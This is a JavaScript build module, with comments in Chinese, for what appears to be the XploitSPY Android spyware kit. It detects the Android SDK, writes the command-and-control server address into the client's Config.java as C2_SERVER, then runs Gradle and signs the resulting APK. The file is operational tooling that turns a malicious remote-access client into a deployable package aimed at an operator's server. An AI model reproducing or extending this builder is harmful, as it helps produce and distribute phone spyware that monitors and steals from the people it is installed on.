const
    cp = require('child_process'),
    fs = require('fs'),
    path = require('path'),
    CONST = require('./const');

/**
 * 获取Android SDK路径
 * 支持多种常见安装位置
 */
function getAndroidSdkPath() {
    // 首先检查环境变量
    if (process.env.ANDROID_HOME) {
        return process.env.ANDROID_HOME;
    }
    if (process.env.ANDROID_SDK) {
        return process.env.ANDROID_SDK;
    }
    
    // 常见Linux安装路径
    const commonPaths = [
        '/opt/android-sdk',
        '/usr/local/android-sdk',
        '/home/android-sdk',
        path.join(require('os').homedir(), 'Android/Sdk'),
        path.join(require('os').homedir(), 'android-sdk'),
        '/var/lib/android-sdk'
    ];
    
    for (const sdkPath of commonPaths) {
        if (fs.existsSync(sdkPath)) {
            return sdkPath;
        }
    }
    
    return null;
}

/**
 * 设置local.properties中的SDK路径
 */
function setupLocalProperties(cb) {
    const sdkPath = getAndroidSdkPath();
    if (!sdkPath) {
        return cb('未找到Android SDK，请设置ANDROID_HOME环境变量或安装Android SDK');
    }
    
    const localPropertiesPath = path.join(CONST.clientPath, 'local.properties');
    const content = `## 此文件由XploitSPY自动生成，请勿手动修改
sdk.dir=${sdkPath}
`;
    
    fs.writeFile(localPropertiesPath, content, 'utf8', (err) => {
        if (err) return cb('写入local.properties失败: ' + err.message);
        console.log('已设置Android SDK路径:', sdkPath);
        return cb(false);
    });
}

/**
 * 检查Java是否已安装
 */
function checkJava(callback) {
    let spawn = cp.spawn('java', ['-version']);
    spawn.on('error', (err) => callback("Java未安装", null));
    spawn.stderr.on('data', (data) => {
        spawn.removeAllListeners();
        spawn.stderr.removeAllListeners();
        return callback(null, "Java已安装");
    });
}

/**
 * 修改Config.java中的C2服务器地址
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} cb - 回调函数
 */
function patchConfig(URI, PORT, cb) {
    fs.readFile(CONST.configFilePath, 'utf8', function (err, data) {
        if (err) return cb('读取Config.java失败: ' + err.message);
        
        // 构建新的服务器URL
        const serverUrl = `http://${URI}:${PORT}`;
        
        // 替换C2_SERVER的值
        // 匹配 public static String C2_SERVER = "...";
        const pattern = /public static String C2_SERVER\s*=\s*"[^"]*";/;
        const replacement = `public static String C2_SERVER = "${serverUrl}";`;
        
        if (!pattern.test(data)) {
            return cb('Config.java中未找到C2_SERVER定义');
        }
        
        const result = data.replace(pattern, replacement);
        
        fs.writeFile(CONST.configFilePath, result, 'utf8', function (err) {
            if (err) return cb('写入Config.java失败: ' + err.message);
            return cb(false);
        });
    });
}

/**
 * 完整的APK构建流程
 * @param {string} URI - 服务器地址
 * @param {string} PORT - 服务器端口
 * @param {function} cb - 回调函数
 */
function buildAPKFull(URI, PORT, cb) {
    // 第一步：设置SDK路径
    setupLocalProperties((err) => {
        if (err) return cb(err);
        
        // 第二步：修改服务器地址
        patchConfig(URI, PORT, (err) => {
            if (err) return cb(err);
            
            // 第三步：执行构建
            buildAPK(cb);
        });
    });
}

/**
 * 使用Gradle构建Release APK
 * @param {function} cb - 回调函数
 */
function buildAPK(cb) {
    checkJava(function (err) {
        if (err) return cb(err);
        
        const sdkPath = getAndroidSdkPath();
        if (!sdkPath) {
            return cb('未找到Android SDK，请设置ANDROID_HOME环境变量');
        }
        
        const options = {
            cwd: CONST.clientPath,
            timeout: 300000, // 5分钟超时
            env: {
                ...process.env,
                ANDROID_HOME: sdkPath,
                ANDROID_SDK: sdkPath
            }
        };
        
        // 执行Gradle构建
        cp.exec(CONST.buildCommand, options, (error, stdout, stderr) => {
            if (error) {
                console.log('Gradle构建输出:', stdout);
                console.log('Gradle构建错误:', stderr);
                return cb('Gradle构建失败: ' + error.message);
            }
            
            console.log('Gradle构建成功');
            
            // 检查未签名APK是否存在
            if (!fs.existsSync(CONST.apkUnsignedPath)) {
                return cb('未找到构建的APK文件: ' + CONST.apkUnsignedPath);
            }
            
            // 签名APK
            cp.exec(CONST.signCommand, (signError, signStdout, signStderr) => {
                if (signError) {
                    console.log('签名输出:', signStdout);
                    console.log('签名错误:', signStderr);
                    return cb('APK签名失败: ' + signError.message);
                }
                
                // 重命名签名后的APK
                const signedApkPath = path.join(CONST.apkOutputPath, 'app-release-aligned-signed.apk');
                const finalPath = CONST.apkSignedBuildPath;
                
                if (fs.existsSync(signedApkPath)) {
                    fs.renameSync(signedApkPath, finalPath);
                }
                
                return cb(false);
            });
        });
    });
}

/**
 * 清理构建缓存
 */
function cleanBuild(cb) {
    const options = {
        cwd: CONST.clientPath,
        timeout: 60000
    };
    
    cp.exec(`${CONST.gradlePath} clean`, options, (error) => {
        if (error) return cb('清理失败: ' + error.message);
        return cb(false);
    });
}

module.exports = {
    buildAPK,
    patchConfig,
    cleanBuild,
    buildAPKFull,
    getAndroidSdkPath,
    // 保持向后兼容
    patchAPK: patchConfig
};
